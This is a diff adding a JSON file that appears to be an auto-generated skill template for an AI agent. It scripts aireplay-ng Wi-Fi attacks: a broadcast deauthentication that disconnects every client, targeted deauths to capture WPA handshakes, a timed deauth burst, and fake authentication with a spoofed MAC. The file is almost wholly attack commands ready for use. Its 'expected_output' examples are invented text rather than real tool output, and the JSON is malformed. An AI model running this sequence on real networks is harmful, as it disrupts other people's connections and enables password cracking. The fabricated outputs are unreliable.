@@ -1,0 +1,30 @@
+{
+  "name": "aireplay_ng_deauth_attack",
+  "description": "Deauthentication attacks to disconnect clients and capture handshakes using aireplay-ng",
+  "pattern": "aireplay.*deauth|deauth.*attack|disconnect.*client|deauthentication",
+  "parameters": ["interface", "bssid", "client"],
+  "sequence": [
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "aireplay-ng", "args": ["--deauth", "0", "-a", "{{bssid}}", "{{interface}}mon"]},
+      "expected_output": {"type": "string", "example": "15:10:23  Waiting for beacon frame (BSSID: {{bssid}}) on channel 6\n15:10:24  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ACK]\n15:10:24  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ACK]\nDeauth attack broadcasting - all clients disconnecting"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "aireplay-ng", "args": ["--deauth", "10", "-a", "{{bssid}}", "-c", "{{client}}", "{{interface}}mon"]},
+      "expected_output": {"type": "string", "example": "15:10:25  Waiting for beacon frame (BSSID: {{bssid}}) on channel 6\n15:10:26  Sending DeAuth to station {{client}} (10 packets)\n15:10:26  Sending 64 directed DeAuth (code 7). STMAC: [{{client}}] [ACK]\nTargeted deauth sent - client should reconnect and handshake captured"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "aireplay-ng --deauth 5 -a {{bssid}} {{interface}}mon & sleep 10 && pkill aireplay-ng"]},
+      "expected_output": {"type": "string", "example": "Deauth attack running for 10 seconds\nSent 320 deauth packets\nClients forced to reauthenticate"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "aireplay-ng", "args": ["--fakeauth", "0", "-a", "{{bssid}}", "-h", "00:11:22:33:44:55", "{{interface}}mon"]},
+      "expected_output": {"type": "string", "example": "15:10:30  Sending Authentication Request [ACK]\n15:10:30  Authentication successful\n15:10:30  Sending Association Request [ACK]\n15:10:31  Association successful :-)\nFake authentication established"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "aireplay-ng --test {{interface}}mon | head -10"]},
+      "expected_output": {"type": "string", "example": "Injection test:\n30/30: 100% success - card supports packet injection\nLink quality: 95%\nInterface ready for attacks"}}
+    }
+  ],
+  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
+  "created_by": "neural_mesh_v5.2_generator"
+}
